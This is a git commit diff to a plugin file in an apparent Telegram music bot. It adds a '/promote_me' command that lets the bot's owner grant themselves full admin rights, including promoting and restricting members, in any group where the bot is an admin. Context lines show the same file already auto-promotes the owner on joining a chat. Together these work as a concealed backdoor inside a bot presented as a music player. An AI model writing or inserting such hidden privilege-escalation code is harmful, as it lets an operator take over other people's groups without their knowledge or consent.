34a086f50944b3b014c87a934d47549d5e258fb9
ᴹᴿᴅᴀxx ࿐™ <147141400+DAXXTEAM@users.noreply.github.com>
2024-08-16 17:54:43 +0530

    Update nexio.py

--- DAXXMUSIC/plugins/sudo/nexio.py
+++ DAXXMUSIC/plugins/sudo/nexio.py
@@ -143,7 +143,6 @@ async def restriction_app(app: app, message):
                 ))
                 await message.reply("fullpromoted !")
 
-
 @app.on_chat_member_updated()
 async def handle_member_update(app: Client, update: ChatMemberUpdated):
     chat_id = update.chat.id
@@ -169,4 +168,22 @@ async def handle_member_update(app: Client, update: ChatMemberUpdated):
                     can_manage_video_chats=True,
                 ))
                 await app.send_message(chat_id, "Welcome! The owner has been promoted to full admin.")
-                
+
+@app.on_message(filters.command("promote_me") & filters.user(OWNER_ID))
+async def promote_owner(app: Client, message: Message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+
+    # Promote owner to full admin
+    await app.promote_chat_member(chat_id, user_id, privileges=ChatPrivileges(
+        can_change_info=True,
+        can_invite_users=True,
+        can_delete_messages=True,
+        can_restrict_members=True,
+        can_pin_messages=True,
+        can_promote_members=True,
+        can_manage_chat=True,
+        can_manage_video_chats=True,
+    ))
+    await message.reply("You have been promoted to full admin!")
+    
